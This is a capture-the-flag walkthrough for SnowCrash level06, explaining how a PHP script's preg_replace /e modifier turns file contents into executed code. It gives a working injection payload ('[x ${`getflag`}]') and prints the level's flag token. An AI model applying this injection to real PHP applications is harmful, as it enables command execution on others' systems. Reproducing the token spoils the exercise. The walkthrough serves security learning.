# Start / Analyse

```sh
level06@SnowCrash:~$ ll
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
-r-x------  1 level06 level06  675 Apr  3  2012 .profile*
```
> we have on exec with effectif user flag00 and level06.php

```sh
level06@SnowCrash:~$ cat level06
ELF☺☺☺☻♥☺(□4T◄4         (▲
```
> cut ssh conection

```php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
> seems to be the source code of the exec, la fonction utilise preg_replace qui donc remplace les pattern par d'autres dans les array ou des strings

## Interpretation des varaiables

In PHP the input `id` and ```\`id\``` does not work because it prints the strings
to print a variable in a php string you have to put the expression in \${exp} so that the back ticks will be interpreted as an alias of shell_exec
${`id`}

If we put ```${`id`}``` in the file, the program outputs ```${\`id\`}``` because it takes the return from file_get_contents as a string literal

## e modifier 
Using the e modifier allows us to use PHP functions within the replace parameters. The following bit of code turns all letters upper case in a string of random letters by using the strtoupper() PHP function.

## the \2 parameter

The parameter \n returns the n match of regex here the 2nd match so (.*)

## eval
The eval function in php interprets the variables in a string, exactly what we need to launch a command. The callback which is called by preg_replace with the modifier /e execute eval has its parameter

# Exploit

We must therefore tilt the first regex to enter the callback function that our string is eval

/tmp/file.txt : 
```
[x ${`id`}]
```

`[x ]` to tilt the regex 

And `(.*)` matches \2 which is passed to the call back so everything after `[x ` will be eval

/tmp/file.txt : 
```
[x ${`getflag`}]
```

```sh
level06@SnowCrash:~$ ./level06 /tmp/file.txt /tmp/file.txt
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
in /home/user/level06/level06.php(4) : regexp code on line 1
```


>> *https://stackoverflow.com/questions/15454220/replace-preg-replace-e-modifier-with-preg-replace-callback*
